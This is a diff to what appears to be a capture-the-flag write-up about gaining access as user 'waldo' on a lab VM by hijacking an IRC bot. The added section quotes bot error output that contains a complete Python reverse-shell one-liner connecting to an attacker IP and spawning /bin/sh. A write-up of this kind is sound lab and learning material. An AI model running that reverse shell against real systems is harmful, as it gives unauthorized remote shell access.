@@ -257,8 +257,8 @@ I have to be the Waldo. Self-actualization aside, it's looking for me to have Wa
 
 Combining information gathered earlier, and my `iptables` access:
 
-`waldo:x:1000:1000:waldo,,,:/home/waldo:/bin/bash`
-`ESTABLISHED - tcp 0 0 127.0.0.1:6667 127.0.0.1:43708`
+*  `waldo:x:1000:1000:waldo,,,:/home/waldo:/bin/bash`
+*  `ESTABLISHED - tcp 0 0 127.0.0.1:6667 127.0.0.1:43708`
 
 I'm going to try to block any internal VM connections to IRC. Yes, I had to look this up, this is how we learn. It also wasn't in the `man` page.
 
@@ -298,3 +298,11 @@ Great success. Now to wait for `waldo` to time out of the IRC room and snipe the
 
 Aha, it's a Python bot. Time to see what I can do now that I'm `waldo` through a surrogate!
 
+Sopel is My Friend
+------------------
+
+In using the bot, I find some difficulty with running bash or Python commands. They're all erroring out, and I'm starting to think it's the bot itself. I can do simple commands like `whoami` and `pwd` but it can't execute past that.
+
+```
+<wallabysbot> FileNotFoundError: [Errno 2] No such file or directory: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.xx.xx",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' (file "/usr/lib/python3.5/subprocess.py", line 1551, in _execute_child)
+```
